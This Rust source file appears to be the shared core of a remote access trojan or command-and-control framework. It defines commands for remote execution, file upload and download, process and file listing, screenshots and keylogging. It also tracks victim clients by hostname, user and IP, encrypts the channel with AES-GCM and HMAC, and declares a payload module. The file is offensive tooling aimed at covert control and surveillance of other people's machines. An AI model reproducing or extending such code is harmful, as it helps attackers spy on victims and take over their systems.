use aes_gcm::{
    aead::{Aead, AeadCore, KeyInit, OsRng},
    Aes256Gcm, Key, Nonce
};
use hmac::{Hmac, Mac};
use sha2::Sha256;
use serde::{Deserialize, Serialize};
use thiserror::Error;
use uuid::Uuid;
use ring::rand::SecureRandom;

#[derive(Error, Debug)]
pub enum CryptoError {
    #[error("Encryption failed")]
    EncryptionError,
    #[error("Decryption failed")]
    DecryptionError,
    #[error("Invalid key length")]
    InvalidKeyLength,
    #[error("Authentication failed")]
    AuthenticationFailed,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum Command {
    Execute { command: String, args: Vec<String> },
    Upload { path: String, data: Vec<u8> },
    Download { path: String },
    SystemInfo,
    ProcessList,
    FileList { path: String },
    Screenshot,
    Keylog,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum Response {
    Success { output: String, data: Option<Vec<u8>> },
    Error { message: String },
    FileData { path: String, data: Vec<u8> },
    SystemInfo { os: String, hostname: String, user: String },
    ProcessList(Vec<ProcessInfo>),
    FileList(Vec<FileInfo>),
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcessInfo {
    pub pid: u32,
    pub name: String,
    pub user: String,
    pub memory: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileInfo {
    pub name: String,
    pub size: u64,
    pub is_dir: bool,
    pub modified: i64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ClientInfo {
    pub id: Uuid,
    pub hostname: String,
    pub os: String,
    pub user: String,
    pub ip: String,
    pub last_seen: i64,
}

#[derive(Clone)]
pub struct Crypto {
    key: Key<Aes256Gcm>,
    hmac_key: Vec<u8>,
}

impl Crypto {
    pub fn new(key: &[u8]) -> Result<Self, CryptoError> {
        if key.len() != 32 {
            return Err(CryptoError::InvalidKeyLength);
        }
        
        let key = Key::<Aes256Gcm>::from_slice(key);
        let hmac_key = key.to_vec();
        
        Ok(Self { key: *key, hmac_key })
    }
    
    pub fn encrypt(&self, data: &[u8]) -> Result<Vec<u8>, CryptoError> {
        let cipher = Aes256Gcm::new(&self.key);
        let nonce = Aes256Gcm::generate_nonce(&mut OsRng);
        
        let mut ciphertext = cipher.encrypt(&nonce, data)
            .map_err(|_| CryptoError::EncryptionError)?;
        
        let mut result = nonce.to_vec();
        result.append(&mut ciphertext);
        
        let mut mac = <Hmac<Sha256> as hmac::Mac>::new_from_slice(&self.hmac_key)
            .map_err(|_| CryptoError::InvalidKeyLength)?;
        mac.update(&result);
        let signature = mac.finalize().into_bytes().to_vec();
        
        result.extend(signature);
        Ok(result)
    }
    
    pub fn decrypt(&self, data: &[u8]) -> Result<Vec<u8>, CryptoError> {
        if data.len() < 48 {
            return Err(CryptoError::DecryptionError);
        }
        
        let (encrypted_data, signature) = data.split_at(data.len() - 32);
        let (nonce_bytes, ciphertext) = encrypted_data.split_at(12);
        
        let mut mac = <Hmac<Sha256> as hmac::Mac>::new_from_slice(&self.hmac_key)
            .map_err(|_| CryptoError::InvalidKeyLength)?;
        mac.update(encrypted_data);
        mac.verify_slice(signature)
            .map_err(|_| CryptoError::AuthenticationFailed)?;
        
        let cipher = Aes256Gcm::new(&self.key);
        let nonce = Nonce::from_slice(nonce_bytes);
        
        cipher.decrypt(nonce, ciphertext)
            .map_err(|_| CryptoError::DecryptionError)
    }
}

pub fn generate_key() -> Vec<u8> {
    let mut key = [0u8; 32];
    ring::rand::SystemRandom::new()
        .fill(&mut key)
        .expect("Failed to generate random key");
    key.to_vec()
}

pub mod payload;

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_encryption_decryption() {
        let key = generate_key();
        let crypto = Crypto::new(&key).unwrap();
        let data = b"Hello, World!";
        
        let encrypted = crypto.encrypt(data).unwrap();
        let decrypted = crypto.decrypt(&encrypted).unwrap();
        
        assert_eq!(data, decrypted.as_slice());
    }
}